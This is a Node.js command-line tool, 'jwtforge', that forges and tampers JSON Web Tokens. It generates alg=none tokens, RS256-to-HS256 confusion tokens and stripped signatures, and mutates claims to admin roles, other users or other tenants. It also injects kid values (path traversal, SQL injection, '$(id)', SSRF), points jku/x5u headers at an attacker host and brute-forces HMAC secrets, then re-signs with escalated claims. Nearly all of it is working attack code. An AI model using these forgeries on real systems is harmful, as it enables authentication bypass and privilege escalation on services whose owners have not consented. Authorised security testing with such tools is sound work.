#!/usr/bin/env node
// jwtforge.js — JWT construction and tampering toolkit.
// Copyright (c) 2026 0xnothings
// @tool jwtforge
// @desc Forge and tamper JWTs: none-alg, RS256->HS256 confusion, claim mutation, kid path traversal, signature stripping
// @usage node tools/jwtforge.js <token> --attack none --json
// @tags security,web,jwt,auth
import crypto from 'node:crypto';
import { args, get, num, flag, die, readInput, table } from '../_lib.js';

const o = args(process.argv.slice(2));
if (o.f.help) {
  console.log(`jwtforge — JWT forge / tamper toolkit

  node tools/jwtforge.js <jwt|token.txt|-> [options]

  node tools/jwtforge.js --create --alg HS256 --secret s3cr3t --claims '{"sub":"admin"}'

  --create          mint a brand new token instead of attacking one
  --alg <a>         algorithm for --create (HS256|HS384|HS512|RS256|ES256|none)
  --secret <s>      HMAC secret or PEM private key file for --create
  --claims <json>   claim payload for --create (or mutations to apply)
  --attack <list>   none,confuse,strip,kid,claims,brute (default: none,confuse,strip,claims)
  --wordlist <p>    secret wordlist for --attack brute (HS256 only)
  --kid-value <v>   kid payload (default: ../../../dev/null)
  --json            machine-readable output
  -h, --help        this text

  Every generated token is printed with the exact header/payload used.`);
  process.exit(0);
}

// process.exit() after a fetch deadlocks libuv on Windows; halting via a thrown
// sentinel keeps the exit code intact without tripping the async handle assert.
class ExitSignal extends Error { constructor() { super('exit-signal'); this.__exitSignal = true; } }
const __exitGuard = (e) => { if (!e || !e.__exitSignal) { process.stderr.write(String(e && e.stack || e) + '\n'); process.exitCode = 1; } };
process.on('uncaughtException', __exitGuard);
process.on('unhandledRejection', __exitGuard);
const exitSoon = (code = 0) => { process.exitCode = code; throw new ExitSignal(); };

function b64u(buf) {
  return Buffer.from(buf).toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
}
function b64uDecode(s) {
  const pad = s.length % 4 ? '='.repeat(4 - (s.length % 4)) : '';
  return Buffer.from(String(s).replace(/-/g, '+').replace(/_/g, '/') + pad, 'base64');
}
function splitToken(tok) {
  const parts = String(tok).trim().split('.');
  if (parts.length < 2) return null;
  let header, payload;
  try { header = JSON.parse(b64uDecode(parts[0]).toString('utf8')); } catch { return null; }
  try { payload = JSON.parse(b64uDecode(parts[1]).toString('utf8')); } catch { payload = null; }
  return { header, payload, signature: parts[2] || '', raw: parts, partCount: parts.length };
}
function signHs(alg, data, secret) {
  const map = { HS256: 'sha256', HS384: 'sha384', HS512: 'sha512' };
  return crypto.createHmac(map[alg] || 'sha256', secret).update(data).digest();
}
function build(header, payload, sigBuf) {
  const h = b64u(JSON.stringify(header));
  const p = b64u(JSON.stringify(payload));
  const s = sigBuf ? b64u(sigBuf) : '';
  return { token: `${h}.${p}.${s}`, header, payload };
}
function publicKeyFromJwk(header) { return header.jwk || null; }

function verifyHs(token, secret) {
  const [h, p, s] = String(token).split('.');
  if (!s) return false;
  const expect = b64u(signHs('HS256', `${h}.${p}`, secret));
  const a = Buffer.from(s);
  const b = Buffer.from(expect);
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

function describeClaims(payload) {
  const out = [];
  if (!payload) return out;
  const now = Math.floor(Date.now() / 1000);
  for (const [k, v] of Object.entries(payload)) {
    let note = '';
    if (k === 'exp' && typeof v === 'number') note = v < now ? `EXPIRED ${Math.round((now - v) / 3600)}h ago` : `${Math.round((v - now) / 3600)}h left`;
    if (k === 'iat' && typeof v === 'number') note = `${Math.round((now - v) / 3600)}h old`;
    if (k === 'nbf' && typeof v === 'number') note = v > now ? 'not yet valid' : 'valid now';
    if (k === 'iss') note = 'issuer';
    if (k === 'aud') note = 'audience';
    if (/^(admin|role|roles|scope|scopes|group|groups|is_admin|privilege)$/i.test(k)) note = 'AUTHORIZATION CLAIM';
    out.push({ claim: k, value: typeof v === 'object' ? JSON.stringify(v).slice(0, 60) : String(v).slice(0, 60), note });
  }
  return out;
}

const attacks = String(get(o, 'attack', 'none,confuse,strip,claims')).toLowerCase().split(',').map((s) => s.trim()).filter(Boolean);
const kidValue = String(get(o, 'kid-value', '../../../dev/null'));
const report = { generated: new Date().toISOString(), created: null, input: null, analysis: null, forged: [], brute: null, errors: [] };

// ---------------- create mode ----------------
if (flag(o, 'create')) {
  const alg = String(get(o, 'alg', 'HS256')).toUpperCase();
  let claims;
  try { claims = JSON.parse(String(get(o, 'claims', '{"sub":"user","role":"user"}'))); } catch { die('--claims must be valid JSON'); }
  const now = Math.floor(Date.now() / 1000);
  if (claims.iat === undefined) claims.iat = now;
  if (claims.exp === undefined) claims.exp = now + 3600;
  const header = { alg, typ: 'JWT' };
  if (alg === 'none') {
    report.created = { ...build(header, claims, null), note: 'unsigned token, alg=none' };
  } else if (alg.startsWith('HS')) {
    const secret = String(get(o, 'secret', ''));
    if (!secret) die('HS* algorithms need --secret');
    const h = b64u(JSON.stringify(header));
    const p = b64u(JSON.stringify(claims));
    report.created = { token: `${h}.${p}.${b64u(signHs(alg, `${h}.${p}`, secret))}`, header, payload: claims };
  } else if (alg === 'RS256' || alg === 'RS384' || alg === 'RS512' || alg === 'ES256') {
    const keyPath = String(get(o, 'secret', ''));
    if (!keyPath) die(`${alg} needs --secret <private-key.pem>`);
    let pem;
    try { const { readFileSync } = await import('node:fs'); pem = readFileSync(keyPath, 'utf8'); } catch { pem = keyPath; }
    const h = b64u(JSON.stringify(header));
    const p = b64u(JSON.stringify(claims));
    const algo = { RS256: 'RSA-SHA256', RS384: 'RSA-SHA384', RS512: 'RSA-SHA512', ES256: 'sha256' }[alg];
    const sig = crypto.createSign(algo).update(`${h}.${p}`).sign(pem);
    report.created = { token: `${h}.${p}.${b64u(sig)}`, header, payload: claims };
  } else die(`unsupported --alg ${alg}`);

  if (flag(o, 'json')) { console.log(JSON.stringify(report, null, 2)); exitSoon(0); }
  console.log(`alg     : ${alg}`);
  console.log(`header  : ${JSON.stringify(report.created.header)}`);
  console.log(`payload : ${JSON.stringify(report.created.payload)}`);
  console.log(`\n${report.created.token}`);
  exitSoon(0);
}
let input = o._[0];
if (!input && !process.stdin.isTTY) input = (await readInput(null)).trim();
if (!input) die('no token given (pass a JWT, a file, or pipe it on stdin)');
let token = input;
if (!token.includes('.') && !flag(o, 'create')) {
  const text = (await readInput(input)).trim();
  token = text.split(/\r?\n/)[0].trim();
}

const parsed = splitToken(token);
if (!parsed) die('input is not a parseable JWT (expected three dot-separated base64url segments)');

report.input = { alg: parsed.header.alg, typ: parsed.header.typ, kid: parsed.header.kid || null, part_count: parsed.partCount, has_signature: !!parsed.signature, length: token.length };
report.analysis = {
  header: parsed.header,
  payload: parsed.payload,
  claims: describeClaims(parsed.payload),
};

// 1. none-alg variants
if (attacks.includes('none')) {
  for (const variant of ['none', 'None', 'NONE', 'nOnE']) {
    const h = { ...parsed.header, alg: variant };
    for (const sigMode of ['empty', 'trailing-dot']) {
      const hh = b64u(JSON.stringify(h));
      const pp = b64u(JSON.stringify(parsed.payload || {}));
      const tok = sigMode === 'empty' ? `${hh}.${pp}.` : `${hh}.${pp}`;
      report.forged.push({ attack: 'alg-none', variant: `${variant}/${sigMode}`, token: tok, header: h, note: sigMode === 'empty' ? 'three segments, empty signature' : 'two segments, no trailing dot' });
    }
  }
}

// 2. RS -> HS confusion: sign with the public key as the HMAC secret
if (attacks.includes('confuse')) {
  const pub = parsed.header.jwk || null;
  let pemPublic = null;
  if (pub && pub.kty === 'RSA' && pub.n && pub.e) {
    try {
      pemPublic = crypto.createPublicKey({ key: { kty: 'RSA', n: pub.n, e: pub.e }, format: 'jwk' }).export({ type: 'spki', format: 'pem' });
    } catch { /* derive at runtime instead */ }
  }
  if (!pemPublic && o.f.publickey) {
    try { const { readFileSync } = await import('node:fs'); pemPublic = readFileSync(String(o.f.publickey), 'utf8'); } catch { pemPublic = String(o.f.publickey); }
  }
  if (pemPublic) {
    const h = { ...parsed.header, alg: 'HS256' };
    const hh = b64u(JSON.stringify(h));
    const pp = b64u(JSON.stringify(parsed.payload || {}));
    const sig = signHs('HS256', `${hh}.${pp}`, pemPublic);
    report.forged.push({ attack: 'algorithm-confusion', variant: 'RS256->HS256 with public key as HMAC secret', token: `${hh}.${pp}.${b64u(sig)}`, header: h, note: 'server verifying with the public key as an HMAC secret accepts this' });
  } else {
    report.errors.push('confusion attack needs the server public key: pass --publickey <pem> or use a token carrying a jwk header');
  }
}

// 3. Signature stripping
if (attacks.includes('strip')) {
  const [h, p] = parsed.raw;
  report.forged.push({ attack: 'signature-strip', variant: 'empty-signature', token: `${h}.${p}.`, header: parsed.header, note: 'signature segment emptied' });
  report.forged.push({ attack: 'signature-strip', variant: 'no-third-segment', token: `${h}.${p}`, header: parsed.header, note: 'only two segments' });
  report.forged.push({ attack: 'signature-strip', variant: 'truncated-signature', token: `${h}.${p}.AA`, header: parsed.header, note: 'one-byte signature placeholder' });
}

// 4. Claim mutation (re-signs only when a secret is supplied)
if (attacks.includes('claims')) {
  const base = parsed.payload || {};
  const mutations = [
    { id: 'admin-flag', apply: (c) => ({ ...c, admin: true, is_admin: true, isAdmin: true }) },
    { id: 'role-escalation', apply: (c) => ({ ...c, role: 'admin', roles: ['admin', 'superuser'], scope: 'admin read write' }) },
    { id: 'sub-swap', apply: (c) => ({ ...c, sub: 'admin', user_id: 1, uid: 1, id: 1 }) },
    { id: 'expiry-extend', apply: (c) => ({ ...c, exp: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 3650 }) },
    { id: 'expiry-remove', apply: (c) => { const x = { ...c }; delete x.exp; delete x.nbf; return x; } },
    { id: 'iss-aud-swap', apply: (c) => ({ ...c, iss: 'https://trusted.example', aud: 'admin-api' }) },
    { id: 'email-verify', apply: (c) => ({ ...c, email_verified: true, verified: true }) },
    { id: 'tenant-swap', apply: (c) => ({ ...c, tenant: 0, tenant_id: 0, org: 'root' }) },
  ];
  const secret = get(o, 'secret', null);
  for (const m of mutations) {
    const claims = m.apply({ ...base });
    const h = { ...parsed.header };
    if (h.alg === 'none' || !secret) {
      // Keep the original signature; the point is to test whether it is even checked.
      const hh = b64u(JSON.stringify(h));
      const pp = b64u(JSON.stringify(claims));
      report.forged.push({ attack: 'claim-mutation', variant: `${m.id} (original signature kept)`, token: `${hh}.${pp}.${parsed.signature}`, header: h, payload: claims, note: 'signature no longer matches the payload — detects servers that never verify' });
    } else if (String(h.alg).startsWith('HS')) {
      const hh = b64u(JSON.stringify(h));
      const pp = b64u(JSON.stringify(claims));
      report.forged.push({ attack: 'claim-mutation', variant: `${m.id} (re-signed with --secret)`, token: `${hh}.${pp}.${b64u(signHs(String(h.alg), `${hh}.${pp}`, String(secret)))}`, header: h, payload: claims, note: 'validly signed if --secret is the real key' });
    }
  }
}

// 5. kid injection
if (attacks.includes('kid')) {
  const kidPayloads = [
    { id: 'path-traversal-devnull', kid: kidValue },
    { id: 'path-traversal-proc', kid: '/proc/self/environ' },
    { id: 'sqli-kid', kid: "' UNION SELECT 'secret' --" },
    { id: 'command-substitution', kid: '$(id)' },
    { id: 'ssrf-kid', kid: 'http://127.0.0.1:8080/key' },
    { id: 'jku-style-url', kid: 'file:///dev/null' },
  ];
  const hh = b64u(JSON.stringify(parsed.header));
  const pp = b64u(JSON.stringify(parsed.payload || {}));
  for (const k of kidPayloads) {
    const h = { ...parsed.header, kid: k.kid, alg: parsed.header.alg === 'none' ? 'HS256' : parsed.header.alg };
    const hh2 = b64u(JSON.stringify(h));
    const sig = signHs('HS256', `${hh2}.${pp}`, '');
    report.forged.push({
      attack: 'kid-injection', variant: k.id,
      token: `${hh2}.${pp}.${b64u(sig)}`, header: h,
      note: `kid=${k.kid} — tests whether the key path is used unsafely (empty-secret HMAC applied)`,
    });
  }
  // jku / x5u header injection
  for (const hdrName of ['jku', 'x5u']) {
    const h = { ...parsed.header, [hdrName]: 'https://attacker.invalid/jwks.json' };
    const hh3 = b64u(JSON.stringify(h));
    report.forged.push({ attack: `${hdrName}-injection`, variant: `header ${hdrName} points at attacker JWKS`, token: `${hh3}.${pp}.${b64u(signHs('HS256', `${hh3}.${pp}`, ''))}`, header: h, note: 'server fetching keys from this header accepts attacker-controlled keys' });
  }
}

// 6. Weak secret brute force (HS*)
if (attacks.includes('brute')) {
  if (!/^HS/.test(String(parsed.header.alg))) {
    report.errors.push(`brute attack only applies to HS* tokens (this is ${parsed.header.alg})`);
  } else {
    const listPath = get(o, 'wordlist', null);
    if (!listPath) { report.errors.push('brute attack needs --wordlist <path>'); }
    else {
      const { readFileSync, existsSync } = await import('node:fs');
      if (!existsSync(listPath)) { report.errors.push(`wordlist not found: ${listPath}`); }
      else {
        const words = readFileSync(listPath, 'utf8').split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
        const [h, p, s] = parsed.raw;
        const target = Buffer.from(s || '');
        const started = Date.now();
        let found = null;
        let tried = 0;
        for (const w of words) {
          tried++;
          const cand = b64u(signHs(String(parsed.header.alg), `${h}.${p}`, w));
          const cb = Buffer.from(cand);
          if (cb.length === target.length && crypto.timingSafeEqual(cb, target)) { found = w; break; }
        }
        report.brute = { wordlist: listPath, tried, found, ms: Date.now() - started, rate_per_s: Math.round(tried / Math.max(0.001, (Date.now() - started) / 1000)) };
        if (found) {
          const h2 = b64u(JSON.stringify({ ...parsed.header, alg: String(parsed.header.alg) }));
          const p2 = b64u(JSON.stringify({ ...(parsed.payload || {}), admin: true, role: 'admin' }));
          report.forged.push({ attack: 'weak-secret', variant: `cracked secret "${found}"`, token: `${h2}.${p2}.${b64u(signHs(String(parsed.header.alg), `${h2}.${p2}`, found))}`, header: parsed.header, note: 're-signed with the recovered secret and escalated claims' });
        }
      }
    }
  }
}

if (flag(o, 'json')) { console.log(JSON.stringify(report, null, 2)); exitSoon(report.forged.length ? 1 : 0); }

console.log(`input   : ${report.input.alg} (${report.input.typ || 'no typ'}), parts=${report.input.part_count}, signature=${report.input.has_signature ? 'present' : 'MISSING'}${report.input.kid ? ', kid=' + report.input.kid : ''}`);
console.log('\nclaims:');
if (report.analysis.claims.length) console.log(table(report.analysis.claims));
else console.log('  (payload did not decode)');

console.log('\nforged variants:');
console.log(table(report.forged.map((f) => ({ attack: f.attack, variant: f.variant.slice(0, 40), note: f.note.slice(0, 50) }))));
for (const f of report.forged) {
  console.log(`\n# ${f.attack} / ${f.variant}`);
  console.log(`  header : ${JSON.stringify(f.header)}`);
  if (f.payload) console.log(`  payload: ${JSON.stringify(f.payload).slice(0, 300)}`);
  console.log(`  token  : ${f.token}`);
  console.log(`  note   : ${f.note}`);
}
if (report.brute) console.log(`\nbrute: tried ${report.brute.tried} of the wordlist in ${report.brute.ms}ms (${report.brute.rate_per_s}/s) -> ${report.brute.found ? 'SECRET = ' + report.brute.found : 'not found'}`);
for (const e of report.errors) console.log(`\n[skipped] ${e}`);
exitSoon(report.forged.length ? 1 : 0);
